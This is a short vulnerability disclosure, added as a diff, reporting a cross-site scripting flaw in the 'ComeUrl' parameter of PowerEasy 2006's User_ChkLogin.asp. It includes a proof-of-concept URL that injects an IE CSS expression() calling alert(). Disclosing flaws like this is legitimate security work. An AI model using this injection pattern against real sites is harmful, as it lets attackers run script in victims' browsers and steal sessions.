@@ -1,0 +1,12 @@
+A XSS in User_ChkLogin.asp of PowerEasy 2006 
+
+i found a xss on "ComeUrl" parameter in "User_ChkLogin.asp" in PowerEasy 2006 , it's "/user/User_ChkLogin.asp?ComeUrl=" 
+ 
+ 
+ 
+for example:
+ 
+ 
+ 
+http://www.example.com:80/user/User_ChkLogin.asp?ComeUrl="; style="XSS:expression(alert(/liscker/))"
+ 
